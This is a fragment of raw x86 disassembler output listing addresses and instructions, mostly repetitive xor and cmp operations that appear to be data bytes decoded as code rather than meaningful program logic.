  410479:	xor    edx,edi
  41047b:	xor    DWORD PTR [ebp-0x56cd61ce],edx
  410481:	xor    dh,BYTE PTR [eax-0x32cd38ce]
  410487:	xor    dl,bl
  410489:	xor    bl,cl
  41048b:	xor    bl,bh
  41048d:	xor    ah,ch
  41048f:	xor    ch,ah
  410491:	xor    dh,bl
  410493:	xor    bh,dl
  410495:	xor    al,BYTE PTR [ecx]
  410497:	xor    ecx,DWORD PTR [eax]
  410499:	xor    ecx,DWORD PTR [edi]
  41049b:	xor    edx,DWORD PTR [esi]
  41049d:	xor    ebx,DWORD PTR [esi]
  41049f:	xor    esp,DWORD PTR [esi]
  4104a1:	xor    ebp,DWORD PTR [esi]
  4104a3:	xor    edi,DWORD PTR [edx]
  4104a5:	xor    eax,DWORD PTR [ebx+0x33]
  4104a8:	dec    eax
  4104a9:	xor    ecx,DWORD PTR [esi+0x33]
  4104ac:	pop    eax
  4104ad:	xor    esp,DWORD PTR [edx+0x33]
  4104b0:	jb     0x4104e5
  4104b2:	xor    BYTE PTR [ebx],0x88
  4104b5:	xor    edx,DWORD PTR [ebx-0x5acc66cd]
  4104bb:	xor    esi,DWORD PTR [ebp-0x29cc41cd]
  4104c1:	xor    ebx,esp
  4104c3:	xor    esp,edx
  4104c5:	xor    ebp,eax
  4104c7:	xor    ebp,esi
  4104c9:	xor    esi,esp
  4104cb:	xor    edi,ebx
  4104cd:	xor    eax,DWORD PTR [edx]
  4104cf:	xor    al,0x9
  4104d1:	xor    al,0x10
  4104d3:	xor    al,0x17
  4104d5:	xor    al,0x1e
  4104d7:	xor    al,0x25
  4104d9:	xor    al,0x2b
  4104db:	xor    al,0x37
  4104dd:	xor    al,0x42
  4104df:	xor    al,0x47
  4104e1:	xor    al,0x4c
  4104e3:	xor    al,0x52
  4104e5:	xor    al,0x5c
  4104e7:	xor    al,0x66
  4104e9:	xor    al,0x76
  4104eb:	xor    al,0x7f
  4104ed:	xor    al,0x9a
  4104ef:	xor    al,0xba
  4104f1:	xor    al,0xc6
  4104f3:	xor    al,0xd2
  4104f5:	xor    al,0xde
  4104f7:	xor    al,0xf2
  4104f9:	xor    al,0xfe
  4104fb:	xor    al,0xa
  4104fd:	xor    eax,0x35713559
  410502:	ja     0x410539
  410504:	xchg   BYTE PTR ds:0x36073592,dh
  41050a:	cmp    al,0x36
  41050c:	mov    eax,0xcf36bd36
  410511:	ss in  eax,dx
  410513:	add    DWORD PTR ss:[edi],esi
  410516:	pop    es
  410517:	aaa    
  410518:	leave  
  410519:	aaa    
  41051a:	in     al,0x37
  41051c:	lock aaa 
  41051e:	push   DWORD PTR [edi]
  410520:	or     BYTE PTR [eax],bh
  410522:	adc    DWORD PTR [eax],edi
  410524:	cmp    BYTE PTR es:[ebx],bh
  410527:	cmp    BYTE PTR [eax+0x38],cl
  41052a:	push   eax
  41052b:	cmp    BYTE PTR [ebx+0x38],ch
  41052e:	jp     0x410568
  410530:	test   DWORD PTR [eax],edi
  410532:	mov    ds:0xf738f238,al
  410537:	cmp    BYTE PTR [eax],bl
  410539:	cmp    DWORD PTR [ecx+edi*1],esp
  41053c:	xor    BYTE PTR [ecx],bh
  41053e:	cmp    al,0x39
  410540:	pop    ebx
  410541:	cmp    ecx,ebx
  410543:	cmp    ebp,esp
  410545:	cmp    esi,edi
  410547:	cmp    DWORD PTR [ecx],ecx
  410549:	cmp    ah,BYTE PTR [esi]
  41054b:	cmp    ch,BYTE PTR [eax+0x3a]
  41054e:	retf   0x23a
  410551:	cmp    edi,DWORD PTR ds:0xa03b783b
  410557:	cmp    edi,edx
  410559:	cmp    ebp,DWORD PTR [edx]
  41055b:	cmp    al,0x68
  41055d:	cmp    al,0x90
  41055f:	cmp    al,0xd3
  410561:	cmp    al,0x16
  410563:	cmp    eax,0x3d993d50
  410568:	mov    dl,0x3d
  41056a:	mov    dh,0x3d
  41056c:	mov    ebx,0xd73dd13d
  410571:	cmp    eax,0x3dff3df1
  410576:	or     eax,0x193e143e
  41057b:	ds pop ds
  41057d:	ds and eax,0x313e2b3e
  410583:	ds inc edx
  410585:	ds inc esi
  410587:	ds dec ebx
  410589:	ds ins BYTE PTR es:[edi],dx
  41058b:	ds jo  0x4105cc
  41058e:	jl     0x4105ce
  410590:	pushf  
  410591:	ds test al,0x3e
  410594:	mov    al,0x3e
  410596:	fdivr  DWORD PTR [esi]
  410598:	lock ds add al,0x3f
  41059c:	sbb    BYTE PTR [edi],bh
  41059e:	sub    BYTE PTR [edi],bh
  4105a0:	cmp    BYTE PTR [edi],bh
  4105a2:	inc    esp
  4105a3:	aas    
  4105a4:	fs aas 
  4105a6:	ins    BYTE PTR es:[edi],dx
  4105a7:	aas    
  4105a8:	je     0x4105e9
  4105aa:	cmp    BYTE PTR [edi],0xa0
  4105ad:	aas    
  4105ae:	lods   al,BYTE PTR ds:[esi]
  4105af:	aas    
  4105b0:	mov    ah,0x3f
  4105b2:	int3   
  4105b3:	aas    
  4105b4:	aam    0x3f
  4105b6:	clc    
  4105b7:	aas    
  4105b8:	add    BYTE PTR [eax+0x0],ah
  4105bb:	add    BYTE PTR [eax+0x0],dl
  4105be:	add    BYTE PTR [eax],al
  4105c0:	or     BYTE PTR [eax],dh
  4105c2:	adc    al,0x30
  4105c4:	sbb    al,0x30
  4105c6:	xor    al,0x30
  4105c8:	dec    esp
  4105c9:	xor    BYTE PTR [eax+0x30],dh
  4105cc:	test   BYTE PTR [eax],dh
  4105ce:	xchg   esp,eax
  4105cf:	xor    BYTE PTR [eax+esi*1+0x30d030b0],ah
  4105d6:	fdiv   DWORD PTR [eax]
  4105d8:	in     al,0x30
  4105da:	add    al,0x31
  4105dc:	or     al,0x31
  4105de:	adc    al,0x31
  4105e0:	sub    BYTE PTR [ecx],dh
  4105e2:	xor    BYTE PTR [ecx],dh
  4105e4:	cmp    BYTE PTR [ecx],dh
  4105e6:	inc    eax
  4105e7:	xor    DWORD PTR [ecx+esi*1+0x4c],eax
  4105eb:	xor    DWORD PTR [eax+0x31],esp
  4105ee:	jl     0x410621
  4105f0:	xor    BYTE PTR [ecx],0x88
  4105f3:	xor    DWORD PTR [ecx+esi*1+0x31c431a8],ecx
  4105fa:	enter  0xe431,0x31
  4105fe:	call   0x72f634
  410603:	xor    cl,BYTE PTR [eax]
  410605:	xor    al,BYTE PTR [eax]
  410607:	add    BYTE PTR [eax],al
  410609:	jo     0x41060b
  41060b:	add    BYTE PTR [eax+eax*1],ah
  41060e:	add    BYTE PTR [eax],al
  410610:	add    BYTE PTR [eax],dh
  410612:	add    al,0x30
  410614:	adc    al,0x30
  410616:	push   eax
  410617:	xor    BYTE PTR [eax+0x30],ch
  41061a:	test   BYTE PTR [eax],dh
  41061c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41061d:	xor    ah,al
  41061f:	xor    ah,ah
  410621:	xor    BYTE PTR [eax],bl
  410623:	xor    DWORD PTR [eax],esi
  410625:	xor    DWORD PTR [eax+0x31],edx
  410628:	jo     0x41065b
  41062a:	add    BYTE PTR [eax],al
  41062c:	add    BYTE PTR [eax+0xc0000],al
  410632:	add    BYTE PTR [eax],al
  410634:	fdiv   DWORD PTR [ecx]
	...
